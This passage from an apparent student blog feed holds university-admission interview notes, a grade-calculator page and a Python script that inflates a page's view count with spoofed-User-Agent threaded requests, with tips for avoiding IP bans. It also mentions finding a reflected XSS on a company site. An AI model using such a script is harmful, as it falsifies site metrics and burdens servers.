<li>後面課程則是在教電腦運作原理和資源共享 (創用CC授權，四項基本權利) 、數位合作等。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>學過那些程式語言? </summary>
    <div class='content markdown-body'>
      <ul>
<li>最熟悉的語言是 C++，其他有學過 Python 及 HTML。</li>
<li>C++ 是在學校資訊課開始學的，後面自己繼續學習 STL、函式和演算法。</li>
<li>Python 則是在高二透過網路影片自學，因為它能解決許多 C++ 無法處理的問題。像我在處理資安的許多題目時，都會用 Python 來撰寫帶有 payload 的攻擊程式。</li>
<li>HTML 則是因為我學習完 Python 後，嘗試寫出透過爬蟲抓取網頁資料的 Discord 機器人，所以也學習了 HTML 的基本架構。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>學校有資訊相關社團嗎? </summary>
    <div class='content markdown-body'>
      <ul>
<li>目前學校內沒有資訊相關的社團。我原本有考慮創立資訊研究社，但因為已經擔任棋藝社社長，無法在高中時期創立新社團，感到相當可惜。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>棋藝社在做什麼? </summary>
    <div class='content markdown-body'>
      <ul>
<li>我在社團中擔任社長，負責規劃整體課程內容。</li>
<li>在社團課的前幾周是讓社員們自由切磋，培養彼此的棋藝及交流，後幾堂課則有舉辦象棋及圍棋競賽。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>你們學校有推廣相關的嗎? 你怎麼獲得資訊的? </summary>
    <div class='content markdown-body'>
      <ul>
<li>我們學校沒有推廣相關課程，我主要是靠興趣探索和自主學習來獲得相關知識。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>小論文是如何準備的 </summary>
    <div class='content markdown-body'>
      <ul>
<li>一開始我和同學們討論製作方向和主題，然後查詢相關資料並進行討論。指導老師確認可行後，開始進行實驗，將收集到的數據與預期結果進行比較，最後製作圖表並撰寫小論文。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>數學程度 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我在會考完升上高一的暑假，有透過網路影片先修高一數學課程，所以在高一時數學成績在校排 2%。</li>
<li>高二大部分時間都投入在程式和英文，因此高二時數學稍微掉落到校排 10%。</li>
<li>不過，因為我在高一學習多項式函數時，有先自學多項式的極限與微積分，所以在高三的一段取得了相當不錯的成績。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>英文程度 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我高一時因為英文基礎較弱，跟不上學校的進度，校排大約在 60%~70% 之間。</li>
<li>升高二暑假時，有請教英文較好的同學準備方法，所以開始規律背單字並嘗試閱讀英文文章。</li>
<li>我現在回頭看，那段期間的努力是很值得的。因為它不僅讓我在高二的英文成績進步到 40%，也使我能不透過翻譯閱讀 Stack Overflow 上的討論。</li>
</ul>

    </div>
  </details>
<h2 id="未來展望">未來展望</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>資安學習 </summary>
    <div class='content markdown-body'>
      <p>臺灣好厲駭、AIS3</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>未來目標 & 讀書計畫 </summary>
    <div class='content markdown-body'>
      <p>讀書計畫:</p>
<ul>
<li>高中
<ul>
<li>利用大學先修課程平台先修基礎數學</li>
</ul>
</li>
<li>大學
<ul>
<li>扎實學習重要的基礎課程</li>
<li>考取資安相關證照及參加競賽</li>
</ul>
</li>
<li>未來
<ul>
<li>攻讀國內研究所</li>
<li>修習教育學程並參與教師檢定及甄試，成為合格教師</li>
</ul>
</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>未來期許 </summary>
    <div class='content markdown-body'>
      <ul>
<li>期待在未來的學習中，能接受理論與實務並重的學習，並透過專題研究與競賽經驗，增強團隊合作與創新能力。</li>
<li>我期望成為具有競爭力的人才，為資訊領域貢獻所學，並實踐創新精神與積極進取的態度。</li>
</ul>

    </div>
  </details>]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>特殊選才</tag>
        <tag>面試</tag>
        <tag>筆記</tag>
      </tags>
  </entry>
  <entry>
    <title>國立嘉義大學 特殊選才面試</title>
    <url>/NCYU/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數：(2+2)</li>
<li>面試時長：(6+6) 分鐘</li>
<li>報名人數：一般 27 / 資安 11</li>
<li>招生名額：一般⠀3 / 資安⠀2</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>嘉義是我最後一間面試的學校，我已經不再對面試感到緊張，能夠從容地回答教授提出的問題。這次 12 分鐘的面試相當緊湊，幾乎把我所有在備審和自我介紹中提到的所有經歷與技術都問到了，也讓我感受到教授們在面試時的用心。教授們的問題都沒有過於刁鑽或深入，與我所了解的知識和技術相符，順利回答完了所有題目。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你有甚麼特別的資安經歷</strong><br>
（略）</li>
<li><strong>教授：擔任衛生股長期間，為班上做了哪些事？</strong><br>
（略）</li>
<li><strong>教授：如果換成其他人擔任，能達到相同成果嗎？</strong><br>
（略）</li>
<li><strong>教授：你在資訊領域學習得很廣泛，為什麼想接觸這麼多領域？</strong><br>
因為從高一下學期開始，就漸漸有了就讀資工系的念頭。為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識。除了程式設計，還有資訊安全、人工智慧及機器學習等，來幫助我探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
<li><strong>教授：你有參加過大學先修？</strong><br>
我在去年參加了中興大學的機器學習先修，課程涵蓋許多常見的機器學習方式及演算法，並介紹其中的原理、細節。不過主要著重在理論觀念的建立，程式實作部分較少。</li>
<li><strong>教授：你會甚麼程式語言</strong><br>
比較擅長 C++，其次是 Python。</li>
<li><strong>教授：C++ / Python 分別學到哪裡？</strong><br>
C++ 學到基礎演算法及 STL；Python 則會基礎語法，並能使用 Pycord 開發 DCbot 及撰寫 pwn 題型的解法。</li>
<li><strong>教授：為什麼想學 python</strong><br>
在學習 C++ 之後，我開始思考如何將所學應用於生活中，想起曾經接觸過 Discord 機器人，讓我萌生了學習 Python 並開發機器人的念頭。</li>
<li><strong>教授：開發 Discord Bot 時遇到哪些困難？如何解決？</strong><br>
在開發 Discord Bot 時，就有遇到爬蟲程式報錯，但我不清楚是哪個部份出了問題。後來在 Stack Overflow 找到相關解法，發現問題出在該網站設有防爬蟲機制。我透過添加 headers 成功繞過限制，解決了問題。</li>
<li><strong>教授：解釋 pass by value 和 pass by reference 的差異。</strong><br>
pass by value 會在函式中改變變數值，但不影響主程式中的變數；而 pass by reference 則直接修改記憶體位置，使主程式的變數同步改變。</li>
<li><strong>教授：你知道物件導向嗎？</strong><br>
閱讀過物件導向相關文章，知道封裝、繼承和多型的概念，但沒有實做過。</li>
<li><strong>教授：你有參加過 AIS3 嗎？</strong><br>
參加過 AIS3 Junior，期待未來可以進一步參加 AIS3 學習更進階的技術。</li>
<li><strong>教授：AIS3 的 pre-exam，你參加過嗎？</strong><br>
我沒有參加過實體 CTF，比較常練習 picoCTF 和教育部培訓課程中的題目。</li>
<li><strong>教授：為什麼不參加實體 CTF 比賽？</strong><br>
高中期間缺乏比賽經驗，主要是因為我們學校對資訊領域有熱忱的同學比較少，加上學校資源有限，也沒有相關的培訓課程。希望能在大學期間與同樣對資訊領域有興趣的同學組隊參加演算法及資安競賽。</li>
<li><strong>教授：講一下你挖到的 XSS 漏洞。</strong><br>
我是在一間燈具公司官網的搜尋欄位中發現漏洞，透過輸入 JavaScript 標籤，可以觸發 Reflected XSS，使得惡意程式碼在使用者瀏覽器中執行。</li>
<li><strong>教授：你知道 OWASP Top 10 嗎？有哪些常見漏洞？</strong><br>
OWASP Top 10 是針對 Web Security 的常見漏洞排行榜，例如 Broken Access Control、SQL Injection、Cross-Site Scripting (XSS) 和 Server Side Template Injection (SSTI) 等，這些漏洞可能導致敏感資訊洩露或系統遭到入侵。</li>
<li><strong>教授：你知道 OWASP 排行榜會變動嗎？</strong><br>
知道，OWASP Top 10 會根據企業實際回報的漏洞數據、風險評估與攻擊趨勢，每隔幾年進行更新。例如 2021 年新增了 Insecure Design 這類與安全設計相關的項目，反映出現代網頁開發中面臨的新風險。</li>
<li><strong>教授：哪些漏洞常年位居榜單？</strong><br>
Injection 及 Broken Access Control 是 OWASP Top 10 長期存在的問題，因為它們影響範圍廣，且攻擊方式多樣，使得許多系統仍容易受到這些攻擊的影響。</li>
<li><strong>教授：你學過密碼學，可以講講對稱與非對稱加密嗎？</strong><br>
對稱式加密使用一把密鑰進行加、解密，運算速度較快，適合大量數據的加密；非對稱加密使用公鑰加密，私鑰解密，常用於數位簽章。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>學期成績計算</title>
    <url>/score/</url>
    <content><![CDATA[<hr>

<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #f9f9f9;
            color: #333;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        label {
            font-weight: bold;
        }

        input, button {
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 6px;
            width: 100%;
            font-size: 16px;
            box-sizing: border-box;
            font-family: inherit;
        }

        input::placeholder {
            color: #888;
        }

        input {
            background-color: #fff;
            color: #333;
            border: 1px solid #ccc;
        }

        button {
            background-color: #888;
            color: white;
            border: none;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #818181;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
        }

        body.dark-mode {
            background-color: #1e1e1e;
            color: #e0e0e0;
        }

        body.dark-mode input {
            background-color: #333333;
            color: #e0e0e0;
            border: 1px solid #444;
        }

        body.dark-mode input::placeholder {
            color: #888;
        }

        body.dark-mode button {
            background-color: #555;
            color: white;
            border: none;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        body.dark-mode button:hover {
            background-color: #777;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
        }

        @media (max-width: 600px) {
            input, button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <h5>請輸入以下成績並按下按鈕，計算結果將顯示在按鈕下方。</h5>
    <hr>
    <form id="score-form">
        <label for="score1">第一次段考成績:</label>
        <input type="number" id="score1" name="score1" placeholder="必填" min="0" max="100" required>

        <label for="score2">第二次段考成績:</label>
        <input type="number" id="score2" name="score2" placeholder="必填" min="0" max="100" required>

        <label for="score3">第三次段考成績:</label>
        <input type="number" id="score3" name="score3" placeholder="選填" min="0" max="100">

        <label for="score4">平時成績:</label>
        <input type="number" id="score4" name="score4" placeholder="選填" min="0" max="100">

        <label for="previous_score">上學期成績:</label>
        <input type="number" id="previous_score" name="previous_score" placeholder="選填" min="0" max="100">

        <button type="submit">計算</button>
        
        <h4>計算結果</h4>
        <p id="result">計算結果僅供參考，祝段考順利！</p>
    </form>

    <script data-swup-reload-script type="text/javascript">
        document.getElementById('score-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const getInputValue = (id) => parseFloat(document.getElementById(id).value);
            const roundToOneDecimal = (num) => parseFloat(num.toFixed(1));

            const score1 = getInputValue('score1');
            const score2 = getInputValue('score2');
            const score3 = getInputValue('score3');
            const score4 = getInputValue('score4');
            const previousScore = getInputValue('previous_score');

            const weightedScore1 = roundToOneDecimal(score1 * 0.2);
            const weightedScore2 = roundToOneDecimal(score2 * 0.2);
            const weightedScore3 = isNaN(score3) ? 0 : roundToOneDecimal(score3 * 0.3);
            const weightedScore4 = isNaN(score4) ? 0 : roundToOneDecimal(score4 * 0.3);
            const totalScore = roundToOneDecimal(weightedScore1 + weightedScore2 + weightedScore3 + weightedScore4);

            let responseMessage = "";

            const calculateRequiredScore = (currentTotal, weight) => roundToOneDecimal((59.5 - currentTotal) / weight);
            const calculateRequiredBothSemesters = (currentTotal, weight) => roundToOneDecimal((120 - previousScore - currentTotal) / weight);

            if (isNaN(score3) && isNaN(score4) && isNaN(previousScore)) {
                responseMessage = `總分(三段+平時)至少為 ${calculateRequiredScore(weightedScore1 + weightedScore2, 0.3)} 分。`;
            } else if (!isNaN(score3) && isNaN(score4) && isNaN(previousScore)) {
                const requiredScore4 = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                responseMessage = `平時成績至少為 ${requiredScore4} 分。`;
            } else if (isNaN(score3) && !isNaN(score4) && isNaN(previousScore)) {
                const requiredScore3 = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                responseMessage = `第三次段考至少為 ${requiredScore3} 分。`;
            } else if (isNaN(score3) && isNaN(score4) && !isNaN(previousScore)) {
                const requiredScoreThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2, 0.6);
                const requiredScoreBothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2, 0.6);
                responseMessage = `本學期要通過總分至少為 ${requiredScoreThisSemester*2} 分。\n兩學期皆通過總分至少為 ${requiredScoreBothSemesters*2} 分。`;
            } else if (!isNaN(score3) && !isNaN(score4) && isNaN(previousScore)) {
                responseMessage = totalScore >= 59.5 ? `恭喜本學期通過\n(本學期成績 ${totalScore} 分)` : `本學期未通過\n(本學期成績 ${totalScore} 分)`;
            } else if (!isNaN(score3) && isNaN(score4) && !isNaN(previousScore)) {
                const requiredScore4ThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                const requiredScore4BothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                responseMessage = `本學期要通過，平時成績至少為 ${requiredScore4ThisSemester} 分。\n兩學期皆通過，平時成績至少為 ${requiredScore4BothSemesters} 分。`;
            } else if (isNaN(score3) && !isNaN(score4) && !isNaN(previousScore)) {
                const requiredScore3ThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                const requiredScore3BothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                responseMessage = `本學期要通過，第三次段考至少為 ${requiredScore3ThisSemester} 分。\n兩學期皆通過，第三次段考至少為 ${requiredScore3BothSemesters} 分。`;
            } else if (!isNaN(score3) && !isNaN(score4) && !isNaN(previousScore)) {
                if ((totalScore + previousScore) >= 119.5) {
                    responseMessage = `恭喜兩學期皆通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else if (totalScore >= 59.5) {
                    responseMessage = `僅有本學期通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else if (previousScore >= 60) {
                    responseMessage = `僅有上學期通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else {
                    responseMessage = `本學期及上學期皆未通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                }
            }
            document.getElementById('result').innerText = responseMessage;
        });
    </script>
</body>
</html>

<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>成績計算方式及說明 </summary>
    <div class='content markdown-body'>
      <h4 id="成績計算方式">成績計算方式</p>
<h5 id="學期成績計算">學期成績計算</p>
<ol>
<li>第一、二次段考：各佔 20%</li>
<li>三段、平時成績：各佔 30%</li>
<li><span class="lightline">學期成績採四捨五入至整數位</span></li>
</ol>
<h5 id="學年成績計算">學年成績計算</p>
<ol>
<li>上、下學期成績：各佔 50%</li>
<li><span class="lightline">學年成績採四捨五入至十分位</span></li>
</ol>
<hr>
<h4 id="輸出內容說明">輸出內容說明</p>
<h5 id="若僅輸入第一、二次段考成績">若僅輸入第一、二次段考成績</p>
<ol>
<li>若無上學期成績：輸出本學期通過 第三次段考和平時成績 最低所需的分數。</li>
<li>若有上學期成績：額外輸出兩學期皆通過 第三次段考和平時成績 最低所需的分數。</li>
</ol>
<h5 id="若輸入兩次段考成績及三段或平時成績其中一項">若輸入兩次段考成績及三段或平時成績其中一項</p>
<ol>
<li>若無上學期成績：輸出本學期通過 另一項 最低所需的分數。</li>
<li>若有上學期成績：額外輸出兩學期皆通過 另一項 最低所需的分數。</li>
</ol>
<h5 id="若輸入所有成績">若輸入所有成績</p>
<ol>
<li>若無上學期成績：輸出本學期是否通過。</li>
<li>若有上學期成績：輸出兩學期通過情況。</li>
</ol>

    </div>
  </details>]]></content>
      <categories>
        <category>小工具</category>
        <category>成績計算</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>成績計算</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 刷瀏覽次數</title>
    <url>/scraper/</url>
    <content><![CDATA[<hr>
<h3 id="說明">說明</h3>
<ul>
<li>建議適當的調整執行次數與間隔時間，避免影響網站正常運作。</li>
<li>怕送太多 request 會被鎖 IP 的話，可以在 Google Colab 運行。</li>
</ul>
<h3 id="環境設定">環境設定</h3>
<ul>
<li>請先安裝 Python 環境，並在終端機貼上以下指令下載所需模組。</li>
<li>進度條是為了在運行時更直觀地看到進度，移除並不會影響功能。</li>
</ul>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install requests tqdm</span><br></pre></td></tr></table></figure></div>
<h3 id="參數調整">參數調整</h3>
<blockquote>
<p>請在 <code>config</code> 自行調整以下參數，總共會送出 <code>('rounds' × 'requests')</code> 次請求。</p>
</blockquote>
<ol>
<li><strong>網　　　　址</strong> (<code>'url': &quot;https://example.com&quot;</code>)</li>
<li><strong>總共進行幾輪</strong> (<code>'rounds': 5</code>)</li>
<li><strong>每輪請求數量</strong> (<code>'requests': 20</code>)</li>
<li><strong>執 行 緒 數 量</strong> (<code>'workers': 10</code>)</li>
<li><strong>每次請求間隔</strong> (<code>'delay': (1.0, 2.0)</code>)</li>
<li><strong>每輪請求間隔</strong> (<code>'DELAY': (5.0, 8.0)</code>)</li>
</ol>
<h3 id="程式碼">程式碼</h3>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> tqdm.rich <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">url, delay</span>):</span><br><span class="line">    start_time = datetime.now()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        min_delay, max_delay = delay</span><br><span class="line">        time.sleep(random.uniform(min_delay, max_delay))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status_code&#x27;</span>: response.status_code,</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: datetime.now() - start_time,</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status_code&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e),</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: datetime.now() - start_time,</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_round</span>(<span class="params">url, round_config, round_num, rounds, wait_time</span>):</span><br><span class="line">    times = round_config[<span class="string">&#x27;requests&#x27;</span>]</span><br><span class="line">    workers = round_config[<span class="string">&#x27;workers&#x27;</span>]</span><br><span class="line">    delay = round_config[<span class="string">&#x27;delay&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> round_num == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> rounds == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;執行第 1/<span class="subst">&#123;rounds&#125;</span> 輪&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;執行第 1/<span class="subst">&#123;rounds&#125;</span> 輪，等待 <span class="subst">&#123;wait_time:<span class="number">.1</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> round_num &lt; rounds - <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n執行第 <span class="subst">&#123;round_num + <span class="number">1</span>&#125;</span>/<span class="subst">&#123;rounds&#125;</span> 輪，等待 <span class="subst">&#123;wait_time:<span class="number">.1</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n執行第 <span class="subst">&#123;round_num + <span class="number">1</span>&#125;</span>/<span class="subst">&#123;rounds&#125;</span> 輪&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=workers) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = [executor.submit(visit, url, delay) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times)]</span><br><span class="line">        <span class="keyword">with</span> trange(times, desc=<span class="string">&quot;進度&quot;</span>, ncols=<span class="number">100</span>, unit=<span class="string">&quot;次&quot;</span>,</span><br><span class="line">                   dynamic_ncols=<span class="literal">False</span>,</span><br><span class="line">                   bar_format=<span class="string">&quot;&#123;l_bar&#125;&#123;bar&#125;| &#123;n_fmt&#125;/&#123;total_fmt&#125; [&#123;elapsed&#125;&lt;&#123;remaining&#125;, &#123;rate_fmt&#125;]&quot;</span>) <span class="keyword">as</span> progress_bar:</span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                future.result()</span><br><span class="line">                progress_bar.update(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> progress_bar.n &lt; progress_bar.total:</span><br><span class="line">                progress_bar.update(progress_bar.total - progress_bar.n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">config</span>):</span><br><span class="line">    url = config[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    rounds = config[<span class="string">&#x27;rounds&#x27;</span>]</span><br><span class="line">    round_config = &#123;</span><br><span class="line">        <span class="string">&#x27;requests&#x27;</span>: config[<span class="string">&#x27;requests&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;workers&#x27;</span>: config[<span class="string">&#x27;workers&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;delay&#x27;</span>: config[<span class="string">&#x27;delay&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    total_start_time = time.time()</span><br><span class="line"></span><br><span class="line">    min_interval, max_interval = config[<span class="string">&#x27;DELAY&#x27;</span>]</span><br><span class="line">    wait_times = [random.uniform(min_interval, max_interval) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>)] + [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> round_num <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        execute_round(url, round_config, round_num, rounds, wait_times[round_num])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> round_num &lt; rounds - <span class="number">1</span>:</span><br><span class="line">            time.sleep(wait_times[round_num])</span><br><span class="line"></span><br><span class="line">    total_time = time.time() - total_start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n(執行時間: <span class="subst">&#123;total_time:<span class="number">.2</span>f&#125;</span> 秒)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;https://example.com&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;rounds&#x27;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&#x27;requests&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">        <span class="string">&#x27;workers&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&#x27;delay&#x27;</span>: (<span class="number">1.0</span>, <span class="number">2.0</span>),</span><br><span class="line">        <span class="string">&#x27;DELAY&#x27;</span>: (<span class="number">5.0</span>, <span class="number">8.0</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    main(config)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>程式設計</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>程式設計</tag>
        <tag>Python</tag>
        <tag>爬蟲</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊選才心得彙整</title>
    <url>/srecruit/</url>
    <content><![CDATA[<hr>
<h3 id="前言">前言</h3>
<p>其實我在高一時，就知道特殊選才這個升學管道了，但從未想過自己能透過這個方式升學。畢竟，<span class="lightline">特殊選才招收的名額僅有應屆學測生的 1% ~ 1.5% ，招生名額遠比其他管道少非常多，也有相當高的不確定性</span>。</p>
<p>不過，因為我的國英實在太差了，若選擇個人申請可能面臨卡標的問題，如此低的國文分數也對分科非常不利。因此，我高二時開始思考是否要嘗試特殊選才，並從那時起積極豐富自身經歷、整理備審資料，讓自己具備更好的競爭力。</p>
<p>雖然當時決定參加特選，但在放榜前，我還是有繼續準備學測。雖然我們無法得知教授希望錄取甚麼類型的學生，不過教授尋找的是未來適合就讀該科系的人，例如：具備自學能力、創新能力等特質。因此，在這段時間，我所能做的就是理性、客觀地分析自己的優勢與不足，不斷學習新知識並從中獲得樂趣，並將學習過程轉化為自己的經歷。</p>
<p>對我而言，學習的重點不是直接得到答案，而是探索與理解的過程。因此，<span class="lightline">在準備備審資料時，不只是單純記錄經歷，而是確保每一項內容都能理解並完整表達，展現出自己的專業能力與學習熱忱，讓教授看到我真正適合該學系的潛力</span>。</p>
<hr>
<h3 id="準備過程">準備過程</h3>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">高一</th>
<th style="text-align:center">高二</th>
<th style="text-align:center">高三</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">上學期</td>
<td style="text-align:center">考前臨時抱佛腳，對未來沒甚麼想法</td>
<td style="text-align:center">投入大量時間學習資訊相關知識</td>
<td style="text-align:center">熬夜準備各校備審、請公假面試</td>
</tr>
<tr>
<td style="text-align:center">下學期</td>
<td style="text-align:center">發現自己對程式設計有較高的領悟力</td>
<td style="text-align:center">決定特選並積極豐富自己的經歷</td>
<td style="text-align:center">N/A</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="特選結果">特選結果</h3>
<blockquote>
<p>依學系放榜日期排序，最終選擇就讀嘉義大學</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">學校名稱</th>
<th style="text-align:center">招生名額</th>
<th style="text-align:center">報名組別</th>
<th style="text-align:center">書審成績</th>
<th style="text-align:center">面試成績</th>
<th style="text-align:center">最終成績</th>
<th style="text-align:center">錄取狀態</th>
<th style="text-align:center">面試心得</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">國立台南大學</td>
<td style="text-align:center">2 / 1</td>
<td style="text-align:center">一般組</td>
<td style="text-align:center">81.81</td>
<td style="text-align:center">81.00</td>
<td style="text-align:center">81.41</td>
<td style="text-align:center">備取 17</td>
<td style="text-align:center"><a href="/NUTN">台南大學</a></td>
</tr>
<tr>
<td style="text-align:center">國立高雄大學</td>
<td style="text-align:center">3 / 0</td>
<td style="text-align:center">一般組</td>
<td style="text-align:center">83.00</td>
<td style="text-align:center">84.67</td>
<td style="text-align:center">83.84</td>
<td style="text-align:center">備取 20</td>
<td style="text-align:center"><a href="/NUK">高雄大學</a></td>
</tr>
<tr>
<td style="text-align:center">台北市立大學</td>
<td style="text-align:center">3 / 0</td>
<td style="text-align:center">一般組</td>
<td style="text-align:center">78.42</td>
<td style="text-align:center">- -</td>
<td style="text-align:center">78.42</td>
<td style="text-align:center">備取 12</td>
